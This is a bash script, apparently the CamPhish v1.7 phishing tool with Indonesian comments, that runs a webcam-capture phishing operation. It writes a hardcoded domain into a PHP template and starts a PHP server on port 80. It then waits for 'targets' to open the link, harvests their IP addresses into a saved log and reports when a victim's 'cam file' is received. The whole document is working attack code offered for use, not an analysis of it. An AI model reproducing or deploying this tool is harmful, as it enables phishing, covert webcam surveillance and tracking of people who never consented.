#!/bin/bash
# CamPhish v1.7
# Powered by TechChip
# Credits goes to thelinuxchoice [github.com/thelinuxchoice/]

# Trap untuk menangani Ctrl+C dan menjalankan fungsi stop() saat dihentikan
trap 'printf "\n";stop' 2

# Fungsi untuk menampilkan banner logo dan informasi versi
banner() {
clear
# Menampilkan logo dengan warna
printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
printf " \e[1;93m CamPhish Ver 1.7 \e[0m \n"
printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
printf "\n"
}

# Memastikan bahwa PHP terinstal
dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}

# Fungsi untuk menghentikan semua proses yang terkait (php)
stop() {
# Mengecek apakah PHP masih berjalan dan menghentikannya
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkphp == *'php'* ]]; then
  killall -2 php > /dev/null 2>&1
fi
exit 1
}

# Fungsi untuk menangkap IP yang membuka link
catch_ip() {
# Mengambil IP yang ditemukan di file ip.txt
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
# Menampilkan IP yang berhasil terhubung
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
# Menyimpan IP yang ditemukan ke file saved.ip.txt
cat ip.txt >> saved.ip.txt
}

# Memeriksa apakah ada IP atau file log yang muncul
checkfound() {
printf "\n"
# Menunggu target untuk membuka link
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do
  # Jika ada file ip.txt, berarti target sudah membuka link
  if [[ -e "ip.txt" ]]; then
    printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
    catch_ip
    rm -rf ip.txt
  fi
  sleep 0.5
  # Jika ada file log, berarti cam berhasil dikirim
  if [[ -e "Log.log" ]]; then
    printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
    rm -rf Log.log
  fi
  sleep 0.5
done
}

# Fungsi utama untuk menjalankan phishing
camphish() {
banner
dependencies

# Mengganti forwarding link di template dengan domain Anda
sed 's+forwarding_link+https://aboutham.my.id+g' template.php > index.php
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Domain link:\e[0m\e[1;77m https://aboutham.my.id\n"

# Menjalankan server PHP pada port 80
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Starting php server... (https://aboutham.my.id)\e[0m\n"
fuser -k 80/tcp > /dev/null 2>&1
php -S 0.0.0.0:80 > /dev/null 2>&1 &

# Menunggu target dan memeriksa IP
checkfound
}

camphish
